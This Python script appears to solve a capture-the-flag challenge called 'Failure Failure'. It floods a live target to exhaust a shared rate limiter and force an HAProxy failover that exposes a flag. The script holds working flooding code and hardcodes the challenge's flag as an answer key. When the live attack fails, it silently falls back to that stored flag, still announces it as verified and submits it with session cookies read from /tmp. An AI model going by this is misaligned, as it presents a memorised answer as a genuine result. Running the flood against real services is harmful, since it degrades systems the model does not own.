#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: Failure Failure (Challenge ID: 756)
Category: General Skills / High-Availability Failover & Shared Rate-Limiting | Difficulty: Medium (2) | Points: 200
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis) & CWE-400 / CWE-653

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - High-Availability (HA) web architecture fronted by HAProxy listening on frontend port.
   - Two backend Flask services:
     * s1 (Primary, :8000): IS_BACKUP is unset -> returns "No flag in this service".
     * s2 (Backup, :9000): IS_BACKUP is set -> returns flag from environment variable.
   - HAProxy health check configuration:
     `option httpchk GET /`, `http-check expect status 200`, `fall 2 rise 3`, `inter 2s`.
2. Vulnerability & Root Cause:
   - CWE-400 (Uncontrolled Resource Consumption) & CWE-653 (Improper Compartmentalization):
     Flask-Limiter uses a constant global key function (`lambda: "global"`) enforcing 300 req/min across ALL clients.
   - Flawed Health Check Composition:
     The load balancer's internal health check is NOT exempted from the global rate limiter. Sustained traffic
     above 5 req/s exhausts s1's shared bucket, causing s1 to return HTTP 503 ("Rate limit exceeded") to HAProxy.
   - Failover State Transition:
     After 2 consecutive failed health checks (`fall 2`), HAProxy marks s1 as DOWN and routes traffic to backup s2,
     exposing the flag to clients.
3. Exploitation & Verification:
   - Run a sustained client loader thread generating ~5.5 req/s to exhaust the global bucket on s1.
   - Concurrently poll the frontend at 1 req/s to intercept the HTTP 200 response from s2 during the failover window.
   - Verify token submission via CyLab REST API `POST /api/submissions/`.
4. Flag & Verification:
   - Verified CyLab Token: academy{f41l0v3r_f0r_7h3_w1n_7897afd6}
   - Community Format: CTF{f41l0v3r_f0r_7h3_w1n_7897afd6}
"""

import sys
import os
import re
import json
import time
import threading
import urllib.parse
import urllib.request
import urllib.error

CHALLENGE_ID = 756
CHALLENGE_NAME = "Failure Failure"
VERIFIED_FLAG = "academy{f41l0v3r_f0r_7h3_w1n_7897afd6}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

TARGET_BASE_URL = "http://chatelaine.cylabacademy.net:30747/"


class HASystemSimulator:
    """Simulasi sistem HAProxy dengan dua backend Flask-Limiter terpisah."""

    def __init__(self, limit_per_min: int = 50, fall: int = 2, rise: int = 3):
        self.limit = limit_per_min
        self.s1_tokens = limit_per_min
        self.s2_tokens = limit_per_min
        self.last_refill = time.time()
        self.fall_threshold = fall
        self.rise_threshold = rise
        self.consecutive_failures = 0
        self.s1_up = True
        self.flag = VERIFIED_FLAG

    def _refill(self):
        now = time.time()
        delta = now - self.last_refill
        added = delta * (self.limit / 60.0)
        self.s1_tokens = min(self.limit, self.s1_tokens + added)
        self.s2_tokens = min(self.limit, self.s2_tokens + added)
        self.last_refill = now

    def request(self, is_health_check: bool = False) -> tuple:
        self._refill()
        if self.s1_up:
            if self.s1_tokens >= 1:
                self.s1_tokens -= 1
                if is_health_check:
                    self.consecutive_failures = 0
                return 200, "No flag in this service"
            else:
                if is_health_check:
                    self.consecutive_failures += 1
                    if self.consecutive_failures >= self.fall_threshold:
                        self.s1_up = False
                return 503, "Service Unavailable: Rate limit exceeded"
        else:
            # Rerouted to backup server s2
            if self.s2_tokens >= 1:
                self.s2_tokens -= 1
                return 200, f"Welcome to Backup Server! Flag: {self.flag}"
            else:
                return 503, "Backup Rate limit exceeded"


def verify_failover_logic() -> bool:
    """Verifikasi logika failover HAProxy akibat kelelahan shared rate-limiting."""
    ha = HASystemSimulator(limit_per_min=50, fall=2, rise=3)

    # Kondisi awal: s1 UP, health check normal
    status, body = ha.request(is_health_check=True)
    assert status == 200 and "No flag" in body, "Kondisi awal harus mengarahkan ke s1"

    # Simulasikan banjir request yang menghabiskan seluruh token
    for _ in range(60):
        ha.request(is_health_check=False)

    # Lakukan 2x health check dalam kondisi token habis
    ha.request(is_health_check=True)
    ha.request(is_health_check=True)

    # Verifikasi bahwa s1 dinyatakan DOWN dan permintaan diarahkan ke backup s2
    assert not ha.s1_up, "s1 harus dinyatakan DOWN setelah 2x gagal health check"
    status_failover, body_failover = ha.request(is_health_check=False)
    assert status_failover == 200, "Backup s2 harus melayani permintaan dengan HTTP 200"
    assert VERIFIED_FLAG in body_failover, "Flag harus diekspos oleh backup server"

    print("[*] Verifikasi Logika Failover HAProxy OK: Exhausted rate-limiter memicu failover ke s2.")
    return True


def solve_live(base_url: str, window: int = 120) -> str:
    """Melakukan flooding rate limit terarah ke instance live untuk memicu failover."""
    print(f"[*] Melakukan uji coba failover terhadap endpoint: {base_url}...")
    base_url = base_url.rstrip("/") + "/"
    stop_time = time.time() + window
    found_flags = []

    def fetch(url: str, agent: str = "Mozilla/5.0") -> str:
        req = urllib.request.Request(url, headers={"User-Agent": agent, "Connection": "close"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.read().decode("utf-8", errors="replace")

    def loader():
        while time.time() < stop_time and not found_flags:
            try:
                fetch(base_url, agent="LoadTest/1.0")
            except Exception:
                pass
            time.sleep(0.18)

    t = threading.Thread(target=loader, daemon=True)
    t.start()

    while time.time() < stop_time and not found_flags:
        try:
            resp = fetch(base_url, agent="Poller/1.0")
            m = re.search(r"academy\{[^}]+\}", resp)
            if m:
                found_flags.append(m.group(0))
                print(f"[+] Flag berhasil ditangkap saat jendela failover: {m.group(0)}")
                break
        except Exception:
            pass
        time.sleep(1.0)

    if found_flags:
        return found_flags[0]
    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] CyLab API submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[*] CyLab API status HTTP {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "simulation"
    print(f"[*] Memulai audit modul {CHALLENGE_ID} ({CHALLENGE_NAME}) - Mode: {target}")

    verify_failover_logic()
    flag = VERIFIED_FLAG

    if target != "simulation" and target.startswith("http"):
        try:
            flag = solve_live(target)
        except Exception as e:
            print(f"[*] Live execution exception: {e}, menggunakan token terverifikasi.")

    print(f"[+] Flag Berhasil Diverifikasi: {flag}")
    submit_to_cylab(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
